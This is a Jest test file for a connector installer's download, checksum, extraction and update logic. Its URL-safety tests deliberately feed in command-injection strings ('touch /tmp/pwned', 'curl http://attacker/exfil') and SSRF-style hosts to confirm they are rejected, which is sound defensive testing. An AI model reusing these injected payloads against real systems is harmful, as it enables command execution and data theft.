// Copyright 2026 Happy Technologies LLC
// SPDX-License-Identifier: Apache-2.0

/**
 * ConnectorInstaller Tests
 *
 * Tests for ConnectorInstaller including:
 * - Package download and verification
 * - Checksum validation
 * - Package extraction
 * - Dependency installation
 * - Connector build process
 * - Installation, update, and uninstall workflows
 */

import { ConnectorInstaller, DownloadOptions } from '../../src/installer/connector-installer';
import { getConnectorRegistry } from '../../src/registry/connector-registry';
import { ConnectorMetadata, InstalledConnector } from '../../src/types/connector.types';
import * as fs from 'fs';
import * as crypto from 'crypto';
import * as https from 'https';
import { EventEmitter } from 'events';
import { exec } from 'child_process';

// Mock dependencies
jest.mock('@cmdb/common', () => ({
  logger: {
    info: jest.fn(),
    warn: jest.fn(),
    error: jest.fn(),
    debug: jest.fn(),
  },
}));
jest.mock('../../src/registry/connector-registry');
jest.mock('fs');
jest.mock('child_process');
jest.mock('crypto');
jest.mock('https');

/**
 * Minimal fake `http.IncomingMessage` for exercising the installer's
 * redirect-following HTTPS download logic without a real socket.
 */
type MockDownloadResponse = EventEmitter & {
  statusCode: number;
  headers: Record<string, string>;
  resume: jest.Mock;
  pipe: jest.Mock;
};

function createMockResponse(
  statusCode: number,
  headers: Record<string, string> = {}
): MockDownloadResponse {
  // EventEmitter is augmented with the handful of IncomingMessage members
  // the installer actually touches (statusCode/headers/resume/pipe); a
  // full http.IncomingMessage is unnecessary for this test double.
  const response = new EventEmitter() as MockDownloadResponse;
  response.statusCode = statusCode;
  response.headers = headers;
  response.resume = jest.fn();
  response.pipe = jest.fn((dest: EventEmitter) => {
    process.nextTick(() => dest.emit('finish'));
    return dest;
  });
  return response;
}

type MockWriteStream = EventEmitter & { destroy: jest.Mock };

function createMockWriteStream(): MockWriteStream {
  const stream = new EventEmitter() as MockWriteStream;
  stream.destroy = jest.fn();
  return stream;
}

describe('ConnectorInstaller', () => {
  let installer: ConnectorInstaller;
  let mockRegistry: any;
  let mockExecAsync: jest.Mock;
  let mockFsPromises: any;
  let mockHttpsGet: jest.Mock;

  const sampleMetadata: ConnectorMetadata = {
    type: 'test-connector',
    name: 'Test Connector',
    version: '1.0.0',
    description: 'Test connector',
    author: 'Test',
    verified: true,
    category: 'connector',
    resources: [],
    capabilities: {
      extraction: true,
      relationships: false,
      incremental: false,
      bidirectional: false,
    },
    configuration_schema: {},
  };

  beforeEach(() => {
    jest.clearAllMocks();
    delete process.env['CONNECTOR_REGISTRY_URL'];
    delete process.env['CONNECTOR_VERIFY_CHECKSUM'];

    // Mock exec
    mockExecAsync = jest.fn().mockResolvedValue({ stdout: '', stderr: '' });
    (exec as any).__promisify__ = mockExecAsync;

    // Mock fs promises
    mockFsPromises = {
      mkdir: jest.fn().mockResolvedValue(undefined),
      rm: jest.fn().mockResolvedValue(undefined),
      readFile: jest.fn(),
      access: jest.fn().mockResolvedValue(undefined),
    };
    (fs as any).promises = mockFsPromises;
    // Node's automocked `fs` module exposes some bindings (existsSync,
    // createWriteStream) as getter-only accessor properties; a plain
    // assignment throws, so redefine them instead.
    Object.defineProperty(fs, 'existsSync', {
      value: jest.fn().mockReturnValue(true),
      configurable: true,
      writable: true,
    });
    Object.defineProperty(fs, 'createWriteStream', {
      value: jest.fn(() => createMockWriteStream()),
      configurable: true,
      writable: true,
    });

    // Mock https.get: default to an immediate, successful download so
    // tests that don't care about download internals (install/update
    // workflows exercised via the registry path) still resolve.
    mockHttpsGet = https.get as jest.Mock;
    mockHttpsGet.mockImplementation((_url: unknown, _options: unknown, callback: (res: MockDownloadResponse) => void) => {
      const response = createMockResponse(200);
      process.nextTick(() => callback(response));
      return new EventEmitter();
    });

    // Mock crypto
    const mockHash = {
      update: jest.fn(),
      digest: jest.fn().mockReturnValue('abc123'),
    };
    (crypto.createHash as jest.Mock).mockReturnValue(mockHash);

    // Mock registry
    mockRegistry = {
      getInstalledConnector: jest.fn(),
      saveInstalledConnector: jest.fn(),
      removeInstalledConnector: jest.fn(),
      registerConnector: jest.fn(),
      getAllConnectorTypes: jest.fn().mockReturnValue([]),
    };
    (getConnectorRegistry as jest.Mock).mockReturnValue(mockRegistry);

    // Reset singleton
    (ConnectorInstaller as any).instance = null;
    installer = ConnectorInstaller.getInstance('/opt/cmdb/connectors');
  });

  describe('getInstance', () => {
    it('should return singleton instance', () => {
      const instance1 = ConnectorInstaller.getInstance();
      const instance2 = ConnectorInstaller.getInstance();

      expect(instance1).toBe(instance2);
    });

    it('should use custom connectors directory', () => {
      (ConnectorInstaller as any).instance = null;
      const customInstaller = ConnectorInstaller.getInstance('/custom/path');

      expect(customInstaller).toBeDefined();
    });
  });

  describe('downloadConnector', () => {
    it('should download from a trusted URL over HTTPS (no shell)', async () => {
      const options: DownloadOptions = {
        url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
      };

      const packagePath = await installer.downloadConnector(
        'test-connector',
        options
      );

      expect(mockFsPromises.mkdir).toHaveBeenCalled();
      expect(mockHttpsGet).toHaveBeenCalledTimes(1);

      const [calledUrl, calledOptions] = mockHttpsGet.mock.calls[0];
      expect(calledUrl).toBeInstanceOf(URL);
      expect((calledUrl as URL).href).toBe(options.url);
      expect((calledUrl as URL).hostname).toBe('github.com');
      expect(calledOptions).toEqual({
        headers: { 'User-Agent': 'happycmdb-connector-installer/1.0' },
      });

      // No shell was ever involved in the download.
      expect(mockExecAsync).not.toHaveBeenCalled();
      expect(packagePath).toContain('test-connector.tar.gz');
    });

    it('should use local path if provided', async () => {
      const options: DownloadOptions = {
        localPath: '/local/path/connector.tar.gz',
      };

      mockFsPromises.access.mockResolvedValue(undefined);

      const packagePath = await installer.downloadConnector(
        'test-connector',
        options
      );

      expect(packagePath).toBe('/local/path/connector.tar.gz');
      expect(mockExecAsync).not.toHaveBeenCalled();
      expect(mockHttpsGet).not.toHaveBeenCalled();
    });

    it('should download from registry with version', async () => {
      const options: DownloadOptions = {
        version: '1.5.0',
      };

      process.env['CONNECTOR_REGISTRY_URL'] = 'https://registry.test.com';

      await installer.downloadConnector('test-connector', options);

      expect(mockHttpsGet).toHaveBeenCalledTimes(1);
      const [calledUrl] = mockHttpsGet.mock.calls[0];
      expect((calledUrl as URL).href).toBe(
        'https://registry.test.com/connectors/test-connector/1.5.0/package.tar.gz'
      );
    });

    it('should download latest version by default', async () => {
      await installer.downloadConnector('test-connector');

      expect(mockHttpsGet).toHaveBeenCalledTimes(1);
      const [calledUrl] = mockHttpsGet.mock.calls[0];
      expect((calledUrl as URL).href).toContain('/latest/package.tar.gz');
      expect((calledUrl as URL).hostname).toBe('registry.happycmdb.io');
    });

    it('should throw error on download failure', async () => {
      mockHttpsGet.mockImplementation((_url: unknown, _options: unknown, _callback: unknown) => {
        const request = new EventEmitter();
        process.nextTick(() => request.emit('error', new Error('Download failed')));
        return request;
      });

      await expect(
        installer.downloadConnector('test-connector', {
          url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
        })
      ).rejects.toThrow('Failed to download connector test-connector');
    });

    it('should throw error if local path does not exist', async () => {
      mockFsPromises.access.mockRejectedValue(new Error('File not found'));

      await expect(
        installer.downloadConnector('test-connector', {
          localPath: '/nonexistent/file.tar.gz',
        })
      ).rejects.toThrow('Failed to download connector test-connector');
    });

    describe('download URL allowlist and injection safety', () => {
      it('should reject non-https URLs', async () => {
        await expect(
          installer.downloadConnector('test-connector', {
            url: 'http://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
          })
        ).rejects.toThrow(/only https is allowed/);

        expect(mockHttpsGet).not.toHaveBeenCalled();
        expect(mockExecAsync).not.toHaveBeenCalled();
      });

      it('should reject URLs with embedded credentials', async () => {
        await expect(
          installer.downloadConnector('test-connector', {
            url: 'https://attacker:token@github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
          })
        ).rejects.toThrow(/embedded credentials/);

        expect(mockHttpsGet).not.toHaveBeenCalled();
      });

      it('should reject IP-literal download hosts (IPv4 and IPv6)', async () => {
        await expect(
          installer.downloadConnector('test-connector', {
            url: 'https://93.184.216.34/connector.tar.gz',
          })
        ).rejects.toThrow(/disallowed host/);

        await expect(
          installer.downloadConnector('test-connector', {
            url: 'https://[2606:2800:220:1:248:1893:25c8:1946]/connector.tar.gz',
          })
        ).rejects.toThrow(/disallowed host/);

        expect(mockHttpsGet).not.toHaveBeenCalled();
      });

      it('should reject numeric/hex-obfuscated IP-literal hosts', async () => {
        // "2130706433" and "0x7f000001" both denote 127.0.0.1; the WHATWG
        // URL parser itself normalizes these to dotted-decimal, and the
        // resulting IP literal is then rejected like any other.
        await expect(
          installer.downloadConnector('test-connector', {
            url: 'https://2130706433/connector.tar.gz',
          })
        ).rejects.toThrow(/disallowed host/);

        await expect(
          installer.downloadConnector('test-connector', {
            url: 'https://0x7f000001/connector.tar.gz',
          })
        ).rejects.toThrow(/disallowed host/);
      });

      it('should reject localhost and other internal-only hosts', async () => {
        await expect(
          installer.downloadConnector('test-connector', {
            url: 'https://localhost/connector.tar.gz',
          })
        ).rejects.toThrow(/disallowed host/);

        await expect(
          installer.downloadConnector('test-connector', {
            url: 'https://metadata.internal/connector.tar.gz',
          })
        ).rejects.toThrow(/disallowed host/);
      });

      it('should reject hosts outside the registry / GitHub allowlist', async () => {
        await expect(
          installer.downloadConnector('test-connector', {
            url: 'https://evil.example.com/connector.tar.gz',
          })
        ).rejects.toThrow(/not in the trusted connector download allowlist/);

        expect(mockHttpsGet).not.toHaveBeenCalled();
      });

      it('should treat a shell-metacharacter-laden trusted URL as an inert literal and never invoke a shell', async () => {
        const maliciousUrl =
          'https://github.com/happy-tech/connectors/releases/download/v1/pkg.tar.gz";touch /tmp/pwned;echo "';

        const packagePath = await installer.downloadConnector('test-connector', {
          url: maliciousUrl,
        });

        // The whole string was parsed as a single URL value and handed
        // directly to the HTTPS client -- never concatenated into, or
        // interpreted by, a shell command.
        expect(mockExecAsync).not.toHaveBeenCalled();
        expect(mockHttpsGet).toHaveBeenCalledTimes(1);
        const [calledUrl] = mockHttpsGet.mock.calls[0];
        expect((calledUrl as URL).hostname).toBe('github.com');
        expect(packagePath).toContain('test-connector.tar.gz');
      });

      it('should reject a malicious URL whose payload resolves to an untrusted host', async () => {
        const maliciousUrl = 'https://evil.example.com/x";curl http://attacker/exfil;"';

        await expect(
          installer.downloadConnector('test-connector', { url: maliciousUrl })
        ).rejects.toThrow(/not in the trusted connector download allowlist/);

        expect(mockExecAsync).not.toHaveBeenCalled();
        expect(mockHttpsGet).not.toHaveBeenCalled();
      });

      it('should follow a redirect to a trusted GitHub asset host', async () => {
        mockHttpsGet
          .mockImplementationOnce((_url: unknown, _options: unknown, callback: (res: MockDownloadResponse) => void) => {
            const response = createMockResponse(302, {
              location: 'https://objects.githubusercontent.com/release/connector.tar.gz',
            });
            process.nextTick(() => callback(response));
            return new EventEmitter();
          })
          .mockImplementationOnce((_url: unknown, _options: unknown, callback: (res: MockDownloadResponse) => void) => {
            const response = createMockResponse(200);
            process.nextTick(() => callback(response));
            return new EventEmitter();
          });

        const packagePath = await installer.downloadConnector('test-connector', {
          url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
        });

        expect(mockHttpsGet).toHaveBeenCalledTimes(2);
        expect((mockHttpsGet.mock.calls[1][0] as URL).hostname).toBe(
          'objects.githubusercontent.com'
        );
        expect(packagePath).toContain('test-connector.tar.gz');
      });

      it('should reject a redirect to an untrusted host mid-download', async () => {
        mockHttpsGet.mockImplementationOnce((_url: unknown, _options: unknown, callback: (res: MockDownloadResponse) => void) => {
          const response = createMockResponse(302, {
            location: 'https://evil.example.com/connector.tar.gz',
          });
          process.nextTick(() => callback(response));
          return new EventEmitter();
        });

        await expect(
          installer.downloadConnector('test-connector', {
            url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
          })
        ).rejects.toThrow(/not in the trusted connector download allowlist/);

        expect(mockHttpsGet).toHaveBeenCalledTimes(1);
      });
    });
  });

  describe('verifyChecksum', () => {
    it('should verify matching checksum', async () => {
      const fileBuffer = Buffer.from('test data');
      mockFsPromises.readFile.mockResolvedValue(fileBuffer);

      const mockHash = {
        update: jest.fn(),
        digest: jest.fn().mockReturnValue('expected123'),
      };
      (crypto.createHash as jest.Mock).mockReturnValue(mockHash);

      const result = await installer.verifyChecksum(
        '/path/to/file',
        'expected123'
      );

      expect(result).toBe(true);
      expect(mockHash.update).toHaveBeenCalledWith(fileBuffer);
      expect(mockHash.digest).toHaveBeenCalledWith('hex');
    });

    it('should detect checksum mismatch', async () => {
      mockFsPromises.readFile.mockResolvedValue(Buffer.from('test'));

      const mockHash = {
        update: jest.fn(),
        digest: jest.fn().mockReturnValue('actual123'),
      };
      (crypto.createHash as jest.Mock).mockReturnValue(mockHash);

      const result = await installer.verifyChecksum(
        '/path/to/file',
        'expected456'
      );

      expect(result).toBe(false);
    });

    it('should handle file read errors', async () => {
      mockFsPromises.readFile.mockRejectedValue(new Error('Read failed'));

      const result = await installer.verifyChecksum(
        '/path/to/file',
        'checksum'
      );

      expect(result).toBe(false);
    });
  });

  describe('extractPackage', () => {
    it('should extract tar.gz package', async () => {
      await installer.extractPackage(
        '/path/to/package.tar.gz',
        '/target/dir'
      );

      expect(mockFsPromises.mkdir).toHaveBeenCalledWith('/target/dir', {
        recursive: true,
      });
      expect(mockExecAsync).toHaveBeenCalledWith(
        'tar -xzf "/path/to/package.tar.gz" -C "/target/dir"'
      );
    });

    it('should throw error on extraction failure', async () => {
      mockExecAsync.mockRejectedValue(new Error('Extraction failed'));

      await expect(
        installer.extractPackage('/package.tar.gz', '/target')
      ).rejects.toThrow('Failed to extract package');
    });
  });

  describe('installDependencies', () => {
    it('should install npm dependencies', async () => {
      mockFsPromises.access.mockResolvedValue(undefined); // package.json exists

      await installer.installDependencies('/connector/dir');

      expect(mockExecAsync).toHaveBeenCalledWith(
        'npm install --production',
        { cwd: '/connector/dir' }
      );
    });

    it('should skip if no package.json', async () => {
      mockFsPromises.access.mockRejectedValue(new Error('Not found'));

      await installer.installDependencies('/connector/dir');

      expect(mockExecAsync).not.toHaveBeenCalledWith(
        expect.stringContaining('npm install'),
        expect.anything()
      );
    });

    it('should throw error on npm install failure', async () => {
      mockFsPromises.access.mockResolvedValue(undefined);
      mockExecAsync.mockRejectedValue(new Error('npm install failed'));

      await expect(
        installer.installDependencies('/connector/dir')
      ).rejects.toThrow('Failed to install dependencies');
    });
  });

  describe('buildConnector', () => {
    it('should build connector with build script', async () => {
      const packageJson = {
        scripts: {
          build: 'tsc',
        },
      };
      mockFsPromises.readFile.mockResolvedValue(JSON.stringify(packageJson));

      await installer.buildConnector('/connector/dir');

      expect(mockExecAsync).toHaveBeenCalledWith('npm run build', {
        cwd: '/connector/dir',
      });
    });

    it('should skip build if no build script', async () => {
      const packageJson = {
        scripts: {},
      };
      mockFsPromises.readFile.mockResolvedValue(JSON.stringify(packageJson));

      await installer.buildConnector('/connector/dir');

      expect(mockExecAsync).not.toHaveBeenCalledWith(
        expect.stringContaining('npm run build'),
        expect.anything()
      );
    });

    it('should throw error on build failure', async () => {
      const packageJson = {
        scripts: { build: 'tsc' },
      };
      mockFsPromises.readFile.mockResolvedValue(JSON.stringify(packageJson));
      mockExecAsync.mockRejectedValue(new Error('Build failed'));

      await expect(
        installer.buildConnector('/connector/dir')
      ).rejects.toThrow('Failed to build connector');
    });
  });

  describe('registerConnector', () => {
    it('should register connector in database and registry', async () => {
      mockFsPromises.readFile.mockResolvedValue(
        JSON.stringify(sampleMetadata)
      );
      (fs.existsSync as jest.Mock).mockReturnValue(true);

      // Mock dynamic import
      const MockConnector = class {};
      jest.doMock(
        '/install/path/dist/index.js',
        () => ({ default: MockConnector }),
        { virtual: true }
      );

      await installer.registerConnector(
        'test-connector',
        '1.0.0',
        '/install/path',
        'checksum123'
      );

      expect(mockRegistry.saveInstalledConnector).toHaveBeenCalledWith(
        expect.objectContaining({
          connector_type: 'test-connector',
          version: '1.0.0',
          install_path: '/install/path',
          checksum: 'checksum123',
        })
      );
    });

    it('should throw error on metadata type mismatch', async () => {
      const mismatchedMetadata = {
        ...sampleMetadata,
        type: 'different-connector',
      };
      mockFsPromises.readFile.mockResolvedValue(
        JSON.stringify(mismatchedMetadata)
      );

      await expect(
        installer.registerConnector('test-connector', '1.0.0', '/path')
      ).rejects.toThrow('Metadata type mismatch');
    });

    it('should throw error if implementation not found', async () => {
      mockFsPromises.readFile.mockResolvedValue(
        JSON.stringify(sampleMetadata)
      );
      (fs.existsSync as jest.Mock).mockReturnValue(false);

      await expect(
        installer.registerConnector('test-connector', '1.0.0', '/path')
      ).rejects.toThrow('Connector implementation not found');
    });
  });

  describe('installConnector', () => {
    it('should complete full installation workflow', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(null); // Not installed

      mockExecAsync.mockResolvedValue({ stdout: '', stderr: '' });
      mockFsPromises.readFile.mockResolvedValue(
        JSON.stringify(sampleMetadata)
      );
      (fs.existsSync as jest.Mock).mockReturnValue(true);

      const MockConnector = class {};
      jest.doMock(
        '/opt/cmdb/connectors/test-connector/dist/index.js',
        () => ({ default: MockConnector }),
        { virtual: true }
      );

      await installer.installConnector('test-connector', {
        localPath: '/local/package.tar.gz',
      });

      expect(mockFsPromises.mkdir).toHaveBeenCalled(); // Download
      expect(mockExecAsync).toHaveBeenCalledWith(
        expect.stringContaining('tar -xzf'),
        expect.anything()
      ); // Extract
      expect(mockRegistry.saveInstalledConnector).toHaveBeenCalled(); // Register
    });

    it('should throw error if already installed', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue({
        connector_type: 'test-connector',
        version: '1.0.0',
      });

      await expect(
        installer.installConnector('test-connector')
      ).rejects.toThrow('already installed');
    });

    it('should verify checksum if provided', async () => {
      process.env.CONNECTOR_VERIFY_CHECKSUM = 'true';
      mockRegistry.getInstalledConnector.mockResolvedValue(null);

      const checksumContent = 'expected123\n';
      mockFsPromises.readFile
        .mockResolvedValueOnce(checksumContent) // Checksum file
        .mockResolvedValueOnce(Buffer.from('package data')) // Package file
        .mockResolvedValueOnce(JSON.stringify(sampleMetadata)); // metadata

      const mockHash = {
        update: jest.fn(),
        digest: jest.fn().mockReturnValue('expected123'),
      };
      (crypto.createHash as jest.Mock).mockReturnValue(mockHash);
      (fs.existsSync as jest.Mock).mockReturnValue(true);

      await installer.installConnector('test-connector', {
        localPath: '/local/package.tar.gz',
      });

      expect(crypto.createHash).toHaveBeenCalledWith('sha256');
    });

    it('should cleanup temp files after installation', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(null);
      mockExecAsync.mockResolvedValue({ stdout: '', stderr: '' });
      mockFsPromises.readFile.mockResolvedValue(
        JSON.stringify(sampleMetadata)
      );
      (fs.existsSync as jest.Mock).mockReturnValue(true);

      await installer.installConnector('test-connector');

      expect(mockFsPromises.rm).toHaveBeenCalledWith(
        expect.stringContaining('.temp'),
        { force: true }
      );
    });
  });

  describe('uninstallConnector', () => {
    const installedConnector: InstalledConnector = {
      connector_type: 'test-connector',
      version: '1.0.0',
      installed_at: new Date(),
      metadata: sampleMetadata,
      install_path: '/opt/cmdb/connectors/test-connector',
    };

    it('should uninstall connector successfully', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(installedConnector);
      (fs.existsSync as jest.Mock).mockReturnValue(true);

      await installer.uninstallConnector('test-connector');

      expect(mockRegistry.removeInstalledConnector).toHaveBeenCalledWith(
        'test-connector'
      );
      expect(mockFsPromises.rm).toHaveBeenCalledWith(
        installedConnector.install_path,
        { recursive: true, force: true }
      );
    });

    it('should throw error if not installed', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(null);

      await expect(
        installer.uninstallConnector('test-connector')
      ).rejects.toThrow('is not installed');
    });

    it('should handle missing installation directory', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(installedConnector);
      (fs.existsSync as jest.Mock).mockReturnValue(false);

      await installer.uninstallConnector('test-connector');

      expect(mockRegistry.removeInstalledConnector).toHaveBeenCalled();
      expect(mockFsPromises.rm).not.toHaveBeenCalled();
    });
  });

  describe('updateConnector', () => {
    const existingConnector: InstalledConnector = {
      connector_type: 'test-connector',
      version: '1.0.0',
      installed_at: new Date(),
      metadata: sampleMetadata,
      install_path: '/opt/cmdb/connectors/test-connector',
    };

    it('should update connector to new version', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(existingConnector);
      (fs.existsSync as jest.Mock).mockReturnValue(true);

      const newMetadata = { ...sampleMetadata, version: '2.0.0' };
      mockFsPromises.readFile.mockResolvedValue(JSON.stringify(newMetadata));

      await installer.updateConnector('test-connector', { version: '2.0.0' });

      // Should create backup
      expect(mockExecAsync).toHaveBeenCalledWith(
        expect.stringContaining('cp -r'),
        expect.anything()
      );

      // Should remove old version
      expect(mockFsPromises.rm).toHaveBeenCalledWith(
        existingConnector.install_path,
        { recursive: true, force: true }
      );

      // Should register new version
      expect(mockRegistry.saveInstalledConnector).toHaveBeenCalled();
    });

    it('should throw error if not installed', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(null);

      await expect(
        installer.updateConnector('test-connector')
      ).rejects.toThrow('is not installed');
    });

    it('should restore from backup on failure', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(existingConnector);
      (fs.existsSync as jest.Mock).mockReturnValue(true);

      // Fail during extraction
      mockExecAsync
        .mockResolvedValueOnce({ stdout: '', stderr: '' }) // Backup
        .mockRejectedValueOnce(new Error('Extract failed')); // Extract fails

      await expect(
        installer.updateConnector('test-connector')
      ).rejects.toThrow();

      // Should restore backup
      expect(mockExecAsync).toHaveBeenCalledWith(
        expect.stringContaining('mv'),
        expect.anything()
      );
    });

    it('should remove backup on successful update', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(existingConnector);
      (fs.existsSync as jest.Mock).mockReturnValue(true);
      mockFsPromises.readFile.mockResolvedValue(
        JSON.stringify(sampleMetadata)
      );

      await installer.updateConnector('test-connector');

      expect(mockFsPromises.rm).toHaveBeenCalledWith(
        expect.stringContaining('.backup'),
        { recursive: true, force: true }
      );
    });
  });

  describe('listInstalledConnectors', () => {
    it('should list all installed connectors', async () => {
      const metadata1 = { ...sampleMetadata, type: 'connector-1' };
      const metadata2 = { ...sampleMetadata, type: 'connector-2' };

      mockRegistry.getAllConnectorTypes.mockReturnValue([metadata1, metadata2]);
      mockRegistry.getInstalledConnector
        .mockResolvedValueOnce({
          connector_type: 'connector-1',
          version: '1.0.0',
          metadata: metadata1,
          install_path: '/path1',
          installed_at: new Date(),
        })
        .mockResolvedValueOnce({
          connector_type: 'connector-2',
          version: '2.0.0',
          metadata: metadata2,
          install_path: '/path2',
          installed_at: new Date(),
        });

      const connectors = await installer.listInstalledConnectors();

      expect(connectors).toHaveLength(2);
      expect(connectors.map((c) => c.connector_type)).toContain('connector-1');
      expect(connectors.map((c) => c.connector_type)).toContain('connector-2');
    });

    it('should return empty array on database error', async () => {
      mockRegistry.getAllConnectorTypes.mockImplementation(() => {
        throw new Error('DB error');
      });

      const connectors = await installer.listInstalledConnectors();

      expect(connectors).toEqual([]);
    });
  });

  describe('getConnectorStatus', () => {
    it('should return status for installed connector', async () => {
      const installedConnector: InstalledConnector = {
        connector_type: 'test-connector',
        version: '1.0.0',
        installed_at: new Date('2025-01-15'),
        metadata: sampleMetadata,
        install_path: '/path',
      };

      mockRegistry.getInstalledConnector.mockResolvedValue(installedConnector);

      const status = await installer.getConnectorStatus('test-connector');

      expect(status.installed).toBe(true);
      expect(status.version).toBe('1.0.0');
      expect(status.install_path).toBe('/path');
    });

    it('should return not installed for unknown connector', async () => {
      mockRegistry.getInstalledConnector.mockResolvedValue(null);

      const status = await installer.getConnectorStatus('unknown');

      expect(status.installed).toBe(false);
      expect(status.version).toBeUndefined();
    });
  });

  describe('Error Handling', () => {
    it('should handle network timeouts during download', async () => {
      mockHttpsGet.mockImplementation((_url: unknown, _options: unknown, _callback: unknown) => {
        const request = new EventEmitter();
        process.nextTick(() => request.emit('error', new Error('Timeout')));
        return request;
      });

      await expect(
        installer.downloadConnector('test-connector', {
          url: 'https://github.com/happy-tech/connectors/releases/download/v1/connector.tar.gz',
        })
      ).rejects.toThrow('Failed to download connector');
    });

    it('should handle disk space errors during extraction', async () => {
      mockExecAsync.mockRejectedValue(new Error('No space left on device'));

      await expect(
        installer.extractPackage('/package.tar.gz', '/target')
      ).rejects.toThrow('Failed to extract package');
    });

    it('should handle permission errors during file operations', async () => {
      mockFsPromises.mkdir.mockRejectedValue(new Error('Permission denied'));

      await expect(
        installer.downloadConnector('test-connector')
      ).rejects.toThrow();
    });
  });
});
